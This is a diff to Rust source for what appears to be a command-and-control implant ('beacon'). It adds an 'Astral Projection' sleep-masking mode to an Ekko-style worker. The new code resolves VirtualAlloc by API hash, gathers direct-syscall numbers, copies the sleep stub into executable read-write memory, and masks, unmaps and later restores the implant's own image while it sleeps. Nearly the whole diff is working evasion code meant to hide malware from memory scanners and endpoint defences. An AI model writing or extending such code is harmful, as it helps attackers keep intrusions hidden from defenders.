@@ -48,6 +48,7 @@ const H_GET_CURRENT_PROCESS: u64 = fnv1a64(b"GetCurrentProcess");
 const H_GET_CURRENT_THREAD: u64 = fnv1a64(b"GetCurrentThread");
 const H_CREATE_THREAD: u64 = fnv1a64(b"CreateThread");
 const H_GET_PROCESS_MITIGATION_POLICY: u64 = fnv1a64(b"GetProcessMitigationPolicy");
+const H_VIRTUAL_ALLOC: u64 = fnv1a64(b"VirtualAlloc");
 
 /// PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY class value of
 /// PROCESS_MITIGATION_POLICY (winnt.h).
@@ -140,6 +141,12 @@ pub struct EkkoCtx {
     pub set_ctx_ssn: u32,
     pub resume_ssn: u32,
     pub gadget: *const c_void,
+    /// External (off-image) copy of the sleep stub + the backup buffer for
+    /// mode 1 (Astral Projection unmap window); 0 = in-image stub, mode 0.
+    pub stub_ext: usize,
+    pub backup: usize,
+    pub unmap_ssn: u32,
+    pub alloc_ssn: u32,
     /// Debug channel handle (crash bisection of the pool dispatch).
     pub dbg: isize,
 }
@@ -172,6 +179,13 @@ pub struct EkkoState {
     pub donor_stack_base: usize,
     pub donor_stack_limit: usize,
     pub donor_ctx: usize,
+    /// External RWX copy of the sleep stub (the stub is PIC, so the copy
+    /// runs at any base): with it the worker runs mode 1 (full-image mask +
+    /// backup + unmap). 0 = unavailable.
+    pub stub_ext: usize,
+    /// SSNs of NtUnmapViewOfSection / NtAllocateVirtualMemory (mode 1).
+    pub unmap_ssn: u32,
+    pub alloc_ssn: u32,
     /// False = indirect dispatch refused (CFG enforced, missing exports,
     /// worker off the stub page, no donor): the beacon sleeps through the
     /// stub directly on its own thread.
@@ -312,8 +326,26 @@ pub unsafe extern "system" fn ekko_worker_cb(
 
     log_handle((*wc).dbg, b"wk: stub\n");
     // ---- the stub: encrypt, sleep, decrypt (on this worker thread) ------
-    let stub: unsafe extern "C" fn(usize) -> usize =
-        core::mem::transmute(crate::runtime::sleepmask::spt_sleepmask as *const c_void);
+    // With an external stub copy + a backup buffer, run mode 1 (Astral
+    // Projection): the whole image is masked, backed up, unmapped for the
+    // sleep, then remapped and restored. Otherwise the in-image stub runs
+    // mode 0 (mask only).
+    let m = (*wc).mask;
+    let ext = (*wc).stub_ext;
+    let stub_addr = if ext != 0 && (*wc).backup != 0 {
+        (*m).mode = 1;
+        (*m).backup = (*wc).backup;
+        (*m).unmap_ssn = (*wc).unmap_ssn;
+        (*m).alloc_ssn = (*wc).alloc_ssn;
+        (*m).img_size = (*m).img_end as u64 - (*m).img_base as u64;
+        (*m).stub_start = (*m).img_end;
+        (*m).stub_end = (*m).img_end;
+        ext
+    } else {
+        (*m).mode = 0;
+        crate::runtime::sleepmask::spt_sleepmask as *const c_void as usize
+    };
+    let stub: unsafe extern "C" fn(usize) -> usize = core::mem::transmute(stub_addr);
     stub((*wc).mask as usize);
 
     log_handle((*wc).dbg, b"wk: back\n");
@@ -373,6 +405,9 @@ impl EkkoState {
             donor_stack_base: 0,
             donor_stack_limit: 0,
             donor_ctx: 0,
+            stub_ext: 0,
+            unmap_ssn: 0,
+            alloc_ssn: 0,
             pool_ok: false,
         }
     }
@@ -419,6 +454,9 @@ pub unsafe fn init(
         donor_stack_base: 0,
         donor_stack_limit: 0,
         donor_ctx: 0,
+        stub_ext: 0,
+        unmap_ssn: 0,
+        alloc_ssn: 0,
         pool_ok: false,
     };
     use specter_core::peb;
@@ -599,6 +637,43 @@ pub unsafe fn init(
     st.donor_stack_limit = (*dc).stack_limit;
     st.donor_ctx = dc as usize;
     st.pool_ok = true;
+
+    // External copy of the sleep stub (Astral Projection mode 1): the stub
+    // is position-independent, so a plain copy in a fresh RWX region runs
+    // at its new base - and can then unmap the image it no longer lives in.
+    st.unmap_ssn = syscalls::unmap_view_ssn(ntdll).unwrap_or(0);
+    st.alloc_ssn = syscalls::allocate_virtmem_ssn(ntdll).unwrap_or(0);
+    if st.unmap_ssn != 0 && st.alloc_ssn != 0 {
+        let va = peb::find_export(kernel32, H_VIRTUAL_ALLOC);
+        if !va.is_null() {
+            let stub_start = crate::runtime::sleepmask::spt_sleepmask as *const () as usize;
+            let marker = specter_core::sleepmask::find_marker(
+                stub_start,
+                0x400,
+                &specter_core::sleepmask::STUB_END_MAGIC,
+            );
+            if let Some(mk) = marker {
+                let stub_size = mk + 8 - stub_start;
+                let va_fn: unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void =
+                    core::mem::transmute(va as *const c_void);
+                let ext = va_fn(
+                    core::ptr::null_mut(),
+                    stub_size,
+                    0x2000 | 0x1000, // MEM_RESERVE|MEM_COMMIT
+                    0x40,            // PAGE_EXECUTE_READWRITE
+                );
+                if !ext.is_null() {
+                    let mut i = 0;
+                    while i < stub_size {
+                        *(ext as *mut u8).add(i) = *(stub_start as *const u8).add(i);
+                        i += 1;
+                    }
+                    st.stub_ext = ext as usize;
+                    log_handle(dbg, b"sm: stubext ok\n");
+                }
+            }
+        }
+    }
     log_handle(dbg, b"sm: ekko ok\n");
     st
 }
